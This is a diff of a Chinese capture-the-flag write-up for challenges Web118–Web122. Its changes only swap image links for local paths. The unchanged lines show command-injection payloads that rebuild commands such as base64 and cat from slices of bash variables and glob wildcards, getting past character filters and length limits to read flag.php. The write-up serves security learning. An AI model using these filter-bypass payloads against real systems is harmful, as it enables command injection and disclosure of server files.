@@ -62,7 +62,7 @@ Web118
   
 尝试输入ls等都被过滤了 ，看其他师傅操作，使用了bash内置变量  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/DBT7MicbvsEwHSedslDjbicfpWo4qzx9ahSh9licU2pwPOKdJ0kTKMibYsDMQ3icXd5gEQksYBt67gyVibvI0TahsmDpvxXsib1OhddcxvrhMoiabDQ/640?wx_fmt=png "")  
+![](../../.resource/remote/162122042c4bbaaa4e2158874d565ab209d9b16b46174b6c3b7ae8ac3f2693a0.png "")  
   
   
 code=${PATH:~C}${PWD:~C} ????.??? 查看源代码得到flag  
@@ -97,17 +97,17 @@ ${PWD:${Z}:${#SHLVL}}
   
 ${PWD:${#}:${#SHLVL}}???${PWD:${#}:${#SHLVL}}??${HOME:${#HOSTNAME}:${#SHLVL}} ????.???  
   
-![](https://mmbiz.qpic.cn/mmbiz_png/DBT7MicbvsEwAx9tTBJfiaaEcpQ6OA6flhorDN7IKvkME4DVdB4XnHRWQNoEteOanCfZibicp6e8p6S1P6Sz6r8knbnebI0Mz8WYczpBJyV7NVk/640?wx_fmt=png "")  
+![](../../.resource/remote/69530b81b218ff0abfe608236f75a832a302cb6d02c4d51dead56c2c0446784f.png "")  
   
 Web120  
   
 有长度限制，  
   
-![](https://mmbiz.qpic.cn/mmbiz_png/DBT7MicbvsEzmkVfrZ8XeMnMelMBj3yfBr7vJNKZjFoftDk46qwDwxswAAiaRicFWsa2p5BicMyaGfe3qWwvowk7v4UDko0iclJ6kPNxKRhic9LjY/640?wx_fmt=png "")  
+![](../../.resource/remote/a7f6fd412177c357ac0b5f7e1b7751864a06633b88349a829936b86e05c40108.png "")  
   
 code=${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?${USER:~A}? ????.???查看源代码得到flag  
   
-![](https://mmbiz.qpic.cn/mmbiz_png/DBT7MicbvsExvodj3cQ1T93Lib4QcSgOsxpA6rYeyQFCp5nQFnvO5l10dctrHlMgxPFCExjZPicGFjLiceGwIGwE7kibZyBic4wqKy0gdwqFchsu0/640?wx_fmt=png "")  
+![](../../.resource/remote/311eb979a4fb61f46be8ef375e794f190fb2cc4a5b7acc0e3b45e6d975466f36.png "")  
   
 Web121  
   
@@ -115,7 +115,7 @@ Web121
   
 /bin/base64 flag.php → /???/?????4 ????.??? → ${PWD::${##}}???${PWD::${##}}?????${#RANDOM} ????.???   
   
-![](https://mmbiz.qpic.cn/mmbiz_png/DBT7MicbvsExaMohQx2TzyjAPUkNtS7amF4iaClhSvqqvpcZwOwsjbUtI7Z1WYqZfHTWsY0lfzs81hEJBrufibfN1Q2B8ADnfqsmYDYooFdqlM/640?wx_fmt=png "")  
+![](../../.resource/remote/6daa96bfcae02a9f37abe21c607863449ff9666c3e34880ee10eca4a32892d57.png "")  
   
 Web122  
   
@@ -129,7 +129,7 @@ code=     <A;${HOME::$?}???${HOME::$?}?????${RANDOM::$?} ????.???< span>      </
   
 要多试几次  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/DBT7MicbvsExxJCHJuzDlOHwSIDMM2Gnhp9n96n4yVBXDCd3GJFKfv5wlGib7IwGOsZWqHT4sGp8ia9YdRSeahWuAeB1C8IEdCFibiaJeF0IicYbk/640?wx_fmt=png "")  
+![](../../.resource/remote/e7c1772ee71f04074fedbec9006074619edb44d4f043f7610a4adedd64342387.png "")  
   
 
 
